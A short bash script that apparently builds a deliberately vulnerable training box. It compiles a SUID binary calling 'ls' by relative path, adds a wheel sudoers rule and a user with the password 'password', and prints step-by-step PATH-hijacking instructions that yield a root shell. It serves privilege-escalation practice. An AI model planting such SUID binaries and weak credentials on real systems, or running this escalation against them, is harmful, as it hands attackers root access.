#!/bin/bash

echo "Bad Linux sysadmin is configuring this box..."
echo "%wheel ALL=(ALL) ALL" >> /etc/sudoers
printf '#include <stdio.h>\nint main(){\nsystem("ls");\n}' > test2.c
gcc test2.c -o test2 -Wimplicit-function-declaration   
rm -rf test2.c
chmod +s test2
echo ""

echo ""
echo "Step 1: Run the program:"
printf "\x1b[32m\"./test2\"\x1b[0m\n"
printf "\nStep 2: It seems to be running \x1b[32m\"ls\"\x1b[0m\n ";
echo ""
echo "Step 3: Move to /tmp"
printf "\x1b[32m\"cd /tmp\"\x1b[0m\n"
echo ""
echo "Step 4: Change command"
printf "\x1b[31m\"echo [whatever command we want to run] > [executable]\"\x1b[0m\n"
echo "so:"
printf "\x1b[32m\"echo '/bin/bash' > ls\"\x1b[0m\n"
echo "make it executable"
printf "\x1b[32m\"chmod +x ls\"\x1b[0m\n"
echo ""
echo "Step 5: Overwrite PATH variable"
printf "\x1b[32m\"export PATH=/tmp:$PATH\"\x1b[0m\n"
echo ""
echo "Step 6: Run program"
printf "\x1b[32m\"cd /root\"\x1b[0m\n"
printf "\x1b[32m\"sudo ./test2\"\x1b[0m\n"
printf "\x1b[32m\"whoami\"\x1b[0m\n"

echo "Changing to user1..."
adduser -S user1 -G wheel -u 321 -D -s /bin/bash
echo user1:password | chpasswd
su user1
clear
cd $HOME 
whoami

 
